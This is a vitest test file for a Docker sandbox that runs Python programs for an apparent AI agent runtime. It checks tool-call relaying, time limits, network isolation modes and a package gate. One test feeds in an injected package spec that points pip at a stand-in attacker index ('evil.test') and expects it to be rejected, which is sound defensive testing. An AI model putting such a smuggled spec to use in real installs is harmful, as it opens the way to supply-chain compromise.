import { spawnSync } from "node:child_process";
import { afterAll, describe, expect, it } from "vitest";
import { loadConfig } from "../src/core/config.js";
import { containerArgs, SandboxManager, type SandboxCall } from "../src/runtime/sandbox.js";

/** The integration tests need Docker and the sandbox image (npm run sandbox:build). */
const cfg = { ...loadConfig().sandbox, pool: 1, timeoutMs: 20_000 };
const ready = spawnSync("docker", ["image", "inspect", cfg.image], { stdio: "ignore" }).status === 0;

const sbx = new SandboxManager(cfg);
afterAll(() => sbx.dispose());

const echo = async (c: SandboxCall) => ({ tool: c.tool, args: c.args });

describe.skipIf(!ready)("sandbox (real Docker)", () => {
  it("runs a program, returns its result and its print output", async () => {
    const r = await sbx.exec("run-a", 'print("hello")\nfrom anvil import result\nresult({"sum": sum(range(10))})', echo);
    expect(r).toMatchObject({ ok: true, result: { sum: 45 }, error: null, timedOut: false });
    expect(r.stdout).toBe("hello\n");
  }, 60_000);

  it("sends tool calls to the host and gives the answers to the program", async () => {
    const code = `
from anvil import tools, classes, result
a = tools.web_fetch(url="https://example.com")
b = classes.x_src_rates(base="EUR")
c = tools.parallel([("web_search", {"query": "q1"}), ("web_search", {"query": "q2"})])
result({"a": a, "b": b, "c": c})`;
    const r = await sbx.exec("run-a", code, echo);
    expect(r.result).toEqual({
      a: { tool: "web_fetch", args: { url: "https://example.com" } },
      b: { tool: "class:x_src_rates", args: { base: "EUR" } },
      c: [
        { tool: "web_search", args: { query: "q1" } },
        { tool: "web_search", args: { query: "q2" } },
      ],
    });
    expect(r.calls.map((c) => c.tool)).toEqual(["web_fetch", "class:x_src_rates", "web_search", "web_search"]);
  }, 60_000);

  it("gives a rejected tool call to the program as an exception", async () => {
    const code = `
from anvil import tools, result, ToolError
try:
    tools.http_request(url="https://x.test", method="POST")
except ToolError as e:
    result(str(e))`;
    const r = await sbx.exec("run-a", code, async () => {
      throw new Error("POST needs an approval");
    });
    expect(r.result).toBe("POST needs an approval");
    expect(r.calls[0]).toMatchObject({ tool: "http_request", ok: false, error: "POST needs an approval" });
  }, 60_000);

  it("keeps /work between the programs of one run, and not between runs", async () => {
    await sbx.exec("run-b", 'open("/work/state.txt", "w").write("kept")', echo);
    const same = await sbx.exec("run-b", 'from anvil import result\nresult(open("/work/state.txt").read())', echo);
    expect(same.result).toBe("kept");
    const other = await sbx.exec("run-c", 'import os\nfrom anvil import result\nresult(os.path.exists("/work/state.txt"))', echo);
    expect(other.result).toBe(false);
    await sbx.release("run-b");
    await sbx.release("run-c");
  }, 90_000);

  it("reports a program error with its traceback", async () => {
    const r = await sbx.exec("run-a", "x = 1 / 0", echo);
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/ZeroDivisionError/);
  }, 60_000);

  it("stops a program at the time limit", async () => {
    const r = await sbx.exec("run-a", "import time\ntime.sleep(30)", echo, { timeoutMs: 2_000 });
    expect(r).toMatchObject({ ok: false, timedOut: true });
    expect(r.error).toMatch(/time limit/);
  }, 60_000);

  it("installs a package through the gate, and the program can import it", async () => {
    const code = `from anvil import install, result\nrec = install("six==1.16.0")\nimport six\nresult({"version": six.__version__, "decisions": rec["decisions"]})`;
    const r = await sbx.exec("run-pkg", code, echo, { timeoutMs: 120_000 });
    expect(r.error).toBeNull();
    expect((r.result as { version: string }).version).toBe("1.16.0");
    expect(r.installs[0]).toMatchObject({ packages: ["six==1.16.0"], ok: true });
    expect(r.installs[0].decisions.some((d) => d.project === "six" && d.decision === "allowed")).toBe(true);
    await sbx.release("run-pkg");
  }, 240_000);

  it("blocks a version with a known vulnerability, and the program sees why", async () => {
    const code = `from anvil import install, result, ToolError\ntry:\n    install("urllib3==1.24.1")\n    result("installed")\nexcept ToolError as e:\n    result(str(e))`;
    const r = await sbx.exec("run-vuln", code, echo, { timeoutMs: 120_000 });
    expect(String(r.result)).toMatch(/The package gate blocked: urllib3 1.24.1: OSV lists a known vulnerability/);
    expect(r.installs[0].ok).toBe(false);
    await sbx.release("run-vuln");
  }, 240_000);

  it("rejects a package spec that is not a plain name and version", async () => {
    const code = `from anvil import install, result, ToolError\ntry:\n    install("six; --index-url http://evil.test")\nexcept ToolError as e:\n    result(str(e))`;
    const r = await sbx.exec("run-a", code, echo);
    expect(String(r.result)).toMatch(/not a valid package spec/);
  }, 60_000);

  it("the sandbox cannot reach PyPI without the gate", async () => {
    const code = `import urllib.request\nfrom anvil import result\ntry:\n    urllib.request.urlopen("https://pypi.org/simple/six/", timeout=5)\n    result("open")\nexcept Exception as e:\n    result(type(e).__name__)`;
    const r = await sbx.exec("run-a", code, echo);
    expect(r.result).not.toBe("open");
  }, 60_000);

  it("cleanup removes only containers whose owner is gone", async () => {
    const a = new SandboxManager(cfg);
    const mine = (await a.exec("run-own", "pass", echo)).container;
    // A container of a process that no longer exists.
    const orphan = `anvil-sbx-orphan-${Date.now()}`;
    expect(spawnSync("docker", containerArgs(cfg, orphan, "999999:gone")).status).toBe(0);
    const b = new SandboxManager(cfg);
    await b.cleanup();
    const exists = (name: string) => spawnSync("docker", ["ps", "-aq", "--filter", `name=${name}`]).stdout.toString().trim() !== "";
    expect(exists(mine)).toBe(true);
    expect(exists(orphan)).toBe(false);
    await a.dispose();
    await b.dispose();
    expect(exists(mine)).toBe(false);
  }, 90_000);

  it("removes the container of a run at release", async () => {
    await sbx.exec("run-d", "pass", echo);
    const name = (await sbx.exec("run-d", "pass", echo)).container;
    await sbx.release("run-d");
    const left = spawnSync("docker", ["ps", "-aq", "--filter", `name=${name}`]).stdout.toString().trim();
    expect(left).toBe("");
  }, 60_000);
});

describe("network modes (container settings)", () => {
  const args = (network: "isolated" | "allowlist" | "open") => containerArgs({ ...cfg, network }, "c", "1:x", 4000);
  const value = (a: string[], flag: string) => a[a.indexOf(flag) + 1];
  it("isolated: the internal network and no proxy", () => {
    const a = args("isolated");
    expect(value(a, "--network")).toBe("anvil-sandbox-net");
    expect(a.some((x) => x.startsWith("HTTPS_PROXY="))).toBe(false);
  });
  it("allowlist: the internal network and the proxy of the sidecar", () => {
    const a = args("allowlist");
    expect(value(a, "--network")).toBe("anvil-sandbox-net");
    expect(a).toContain("HTTPS_PROXY=http://anvil-gate-4000:3128");
    expect(a).toContain("NO_PROXY=anvil-gate-4000");
  });
  it("open: the default bridge network", () => {
    expect(value(args("open"), "--network")).toBe("bridge");
  });
  it("each mode keeps the limits", () => {
    for (const m of ["isolated", "allowlist", "open"] as const) {
      const a = args(m);
      expect(a).toEqual(expect.arrayContaining(["--read-only", "--cap-drop", "ALL", "--pids-limit", "128", "--init", "--user", "10001:10001"]));
    }
  });
});
